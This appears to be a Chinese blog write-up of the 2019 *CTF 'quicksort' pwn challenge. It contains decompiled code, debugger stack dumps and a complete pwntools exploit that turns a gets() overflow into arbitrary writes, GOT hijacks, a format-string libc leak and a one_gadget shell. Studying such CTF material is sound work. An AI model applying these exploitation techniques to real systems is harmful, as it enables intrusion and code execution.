---
title: 2019-Starctf-quicksort
date: 2019-04-29 18:15:42
tags: [ctf, pwn, wp]
---

略有点脑洞的 Got hijack。

<!-- more -->

记录一下国际大赛上做出的第一道 pwn 题。

# Checksec

```bash
root@aa922ef5677a:~/tmp# checksec ./quicksort
[*] '/root/tmp/quicksort'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```

# Analysis

```cpp
unsigned int func()
{
  char *num; // ebx
  char s; // [esp+Ch] [ebp-2Ch]
  char v3; // [esp+Dh] [ebp-2Bh]
  char v4; // [esp+Eh] [ebp-2Ah]
  char v5; // [esp+Fh] [ebp-29h]
  char v6; // [esp+10h] [ebp-28h]
  char v7; // [esp+11h] [ebp-27h]
  char v8; // [esp+12h] [ebp-26h]
  char v9; // [esp+13h] [ebp-25h]
  char v10; // [esp+14h] [ebp-24h]
  char v11; // [esp+15h] [ebp-23h]
  char v12; // [esp+16h] [ebp-22h]
  char v13; // [esp+17h] [ebp-21h]
  char v14; // [esp+18h] [ebp-20h]
  char v15; // [esp+19h] [ebp-1Fh]
  char v16; // [esp+1Ah] [ebp-1Eh]
  char v17; // [esp+1Bh] [ebp-1Dh]
  int sum; // [esp+1Ch] [ebp-1Ch]
  int i; // [esp+20h] [ebp-18h]
  int j; // [esp+24h] [ebp-14h]
  char *ptr; // [esp+28h] [ebp-10h]
  unsigned int v22; // [esp+2Ch] [ebp-Ch]

  v22 = __readgsdword(0x14u);
  v3 = 0;
  v4 = 0;
  v5 = 0;
  v6 = 0;
  v7 = 0;
  v8 = 0;
  v9 = 0;
  v10 = 0;
  v11 = 0;
  v12 = 0;
  v13 = 0;
  v14 = 0;
  v15 = 0;
  v16 = 0;
  v17 = 0;
  s = 0;
  sum = 0;
  puts("how many numbers do you want to sort?");
  __isoc99_scanf("%d", &sum);
  getchar();
  ptr = (char *)malloc(4 * sum);
  for ( i = 0; i < sum; ++i )
  {
    printf("the %dth number:", i + 1);
    gets(&s);
    num = &ptr[4 * i];
    *(_DWORD *)num = atoi(&s);
  }
  quicksort((int)ptr, 0, sum - 1);
  puts("Here is the result:");
  for ( j = 0; j < sum; ++j )
    printf("%d ", *(_DWORD *)&ptr[4 * j]);
  puts(&byte_8048AD2);
  free(ptr);
  return __readgsdword(0x14u) ^ v22;
}
```

程序要求输入一个数字 sum，然后再输入 sum 个数字，最后对这些数字快排之后得到结果。

这里漏洞很明显是有一个 `gets`，然而显然做不到直接 rop。在调试一段时间之后，发现了一个任意地址写的地方：

```
assassinq>> stack 20
0000| 0xffe85300 --> 0xffe8531c --> 0x0
0004| 0xffe85304 --> 0x1
0008| 0xffe85308 --> 0xffe85348 --> 0xffe85358 --> 0x0
0012| 0xffe8530c --> 0x80488c5 (mov    eax,DWORD PTR [ebp-0x1c])
0016| 0xffe85310 --> 0xffe85348 --> 0xffe85358 --> 0x0
0020| 0xffe85314 --> 0xf77b8010 (<_dl_runtime_resolve+16>:	pop    edx)
0024| 0xffe85318 --> 0xf7782864 --> 0x0
0028| 0xffe8531c --> 0x0
0032| 0xffe85320 --> 0x0
0036| 0xffe85324 --> 0x0
0040| 0xffe85328 --> 0x0
0044| 0xffe8532c --> 0x2
0048| 0xffe85330 --> 0x0
0052| 0xffe85334 --> 0x0
0056| 0xffe85338 --> 0x83d0008 --> 0x0
0060| 0xffe8533c --> 0x9838e200
0064| 0xffe85340 --> 0x1
0068| 0xffe85344 --> 0x0
0072| 0xffe85348 --> 0xffe85358 --> 0x0
0076| 0xffe8534c --> 0x80489e4 (mov    eax,0x0)
```

在读取数字的 `gets` 这里停下，查看栈的情况。这里的 `0x83d0008` 是程序中的 `ptr`，然后程序会将我们输入的字符串 `atoi` 之后，赋给 `ptr` 指向的地址。在中间还有一个地址存放剩余循环的次数。我们可以通过缓冲区溢出，一开始的数字为我们想要修改的内容，中间存放剩余循环次数，最后放我们要写的地址，就达到了任意地址写的目的。而 `canary` 又在下面，不会受到影响。

接下来就需要想办法泄漏，n132 学长提供了一个思路就是改成 `printf` 之后直接 format string。最后的思路是把 `free` 改成了 `printf`，然后泄漏 libc 上的地址。这里要注意的一点就是 `atoi` 返回的值是 `signed int`，如果字符串超过了四个字符，那就会返回 `0x7fffffff`，所以泄漏的时候找了第六个参数，`%6$p` 就不会超过 `signed int`。

```
0056| 0xff8348f8 --> 0x804a800 --> 0x7fffffff
```

`free` 完之后还需要写 `one_gadget`，所以这里想办法再跳回到 `func`。想要绕过 `canary` 肯定是不可能了，所以前面也利用了一次任意写，把 `__stack_chk_fail` 改成了 `func`，这样又能跳回来。

最后写 `one_gadget` 的时候又遇到了上面 `signed int` 的问题，这个无法避免了。想到的一个骚思路是用补码，传一个负数进去，就能写上 `one_gadget` 了。

# Exploit

```python
#!/usr/bin/env python
from pwn import *
context.log_level = 'debug'
context.arch = 'i386'
context.terminal = ['tmux', 'sp', '-h']
local = 0
if local:
	p = process('./quicksort')
	libc = ELF('/lib/i386-linux-gnu/libc.so.6')
else:
	p = remote('34.92.96.238', 10000)
	libc = ELF('./libc.so.6')
elf = ELF('./quicksort')
g = lambda x: next(elf.search(asm(x)))
gets_plt = elf.plt['gets']
gets_got = elf.got['gets']
puts_plt = elf.plt['puts'] # 0x8048560
puts_got = elf.got['puts'] # 0x804a02c
free_got = elf.got['free'] # 0x804a018
atoi_got = elf.got['atoi']
printf_got = elf.got['printf']
printf_plt = elf.plt['printf']
func = 0x08048816
buf = 0x0804a000 + 0x800 # 0x0804b000 - 0x100
stack_chk_fail_got = elf.got['__stack_chk_fail']
#gdb.attach(p, '''
#b *0x80489aa
#''')

def write(addr, val, t):
	payload = str(val)
	payload += (0x10 - len(payload)) * '\x00'
	payload += p32(t)
	payload += (0x1C - len(payload)) * '\x00'
	payload += p32(addr)
	p.recvuntil('number:')
	p.sendline(payload)

def overflow(addr, val, t):
	payload = str(val)
	payload += (0x10 - len(payload)) * '\x00'
	payload += p32(t)
	payload += (0x1C - len(payload)) * '\x00'
	payload += p32(addr) + '\x00' * 4
	p.recvuntil('number:')
	p.sendline(payload)

t = 2
p.recvuntil('sort?\n')
p.sendline(str(t))
write(free_got, printf_plt, 2)
write(stack_chk_fail_got, func, 2)
fmt = '%6$p'
overflow(buf, str(int(fmt[::-1].encode('hex'), 16)), 1)
p.recvuntil('0x')
libc_base = int(p.recv(8), 16) - 0x1b3864
success('libc_base = ' + hex(libc_base))
one_gadget = libc_base + 0x3ac62
success('one_gadget = ' + hex(one_gadget))
one_gadget_complement = -(0x100000000 - one_gadget)
success('one_gadget_complement = ' + hex(one_gadget_complement))

p.recvuntil('sort?\n')
p.sendline(str(t))
overflow(stack_chk_fail_got, one_gadget_complement, 1)
p.interactive()
```
